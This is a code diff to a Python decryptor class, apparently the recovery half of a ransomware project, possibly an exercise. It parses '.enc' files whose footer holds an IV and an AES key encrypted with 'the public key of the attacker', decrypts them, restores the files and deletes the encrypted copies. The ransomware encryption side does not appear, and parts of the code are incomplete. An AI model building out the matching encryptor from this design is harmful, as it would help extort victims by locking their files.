@@ -85,13 +85,7 @@ class Decryptor:
         self.filepaths = [file for result in results for file in result]  # Extract normal files
         
         end_time = time.time()
-        print(f"[LOG] Files found: {len(self.filepaths)}, time elapsed: {end_time - start_time:.2f}s")
-        
-
-    
-    def get_footer(self, file_contents):
-        with open(file_path, "rb") as encrypted_file:
-            encrypted_file.read()
+        print(f"[LOG] Files found: {len(self.filepaths)}, time elapsed: {end_time - start_time:.2f}s")     
 
     def decrypt_footer(self, encrypted_IV, encrypted_AES_key):
         """
@@ -108,12 +102,11 @@ class Decryptor:
         
         #decrypt AES key
         key = keygen.decrypt(encrypted_AES_key)
-        print(f"[LOG] footer decrypted: {iv} {key}")
-        #create footer
+        print(f"[LOG] footer decrypted, IV: {iv} AES_key: {key}")
         
         return iv, key
 
-    def decrypt(self, files_list=["image.jpg.enc"]):
+    def decrypt(self, files_list=[]):
         """
         The encrypt function called by threading.
         """
@@ -128,27 +121,43 @@ class Decryptor:
 
             try:
                 # open file 
-                with open("image.jpg.enc", 'rb') as file:
+                with open(filepath, 'rb') as file:
                     data = file.read()
 
-                    parts = data.split(b"---")
+                    # split the file into, part encrypted by AES key and the AES key, which is encrypted by the public key of the attacker
+                    parts = data.split(b"\n---\n")
 
                     encrypted_content = parts[0].strip()
-                    encrypted_IV = parts[1].strip().decode()
-                    encrypted_AES_key = parts[2].strip().decode()
-                    print("sucess")
+                    encrypted_IV = parts[1].strip()
+                    encrypted_AES_key = parts[2].strip()
 
-
+                # check if a new AES should be decrypted, or if the same AES key was used in this file
                 if previous_encrypted_AES_key == encrypted_AES_key:
-                    pass
-                
+                    print(f"[LOG] footer unchanged, using same AES key: {AES_key}")
+
                 else:
                     print("[LOG] New footer detected, decrypting AES key")
-                    iv, AES_key = self.decrypt_footer(encrypted_IV, encrypted_AES_key)
+                    decrypted_iv, decrypted_AES_key = self.decrypt_footer(encrypted_IV, encrypted_AES_key)
 
-                #this is to preform a check if the previous footer is the same as the current footer
-                previous_encrypted_AES_key = AES_key
+                    #load AES key and iv
+                    symenc = Symmetric_encryption()
+                    symenc.iv = decrypted_iv
+                    symenc.AES_key = decrypted_AES_key
 
+                    #this is to preform a check if the previous footer is the same as the current footer
+                    previous_encrypted_AES_key = encrypted_AES_key
+
+                #decrypt encrypted content
+                decrypted_data = symenc.decrypt_string(encrypted_content)
+
+                decrypted_filepath = filepath[:-4] #remove .enc from filepath
+
+                with open(decrypted_filepath, "wb") as decrypted_file:
+                    decrypted_file.write(decrypted_data)
+
+                #remove encrypted file
+                os.remove(filepath)
+    
             except Exception as e:
                 print(f"[LOG] error: {e}")
 
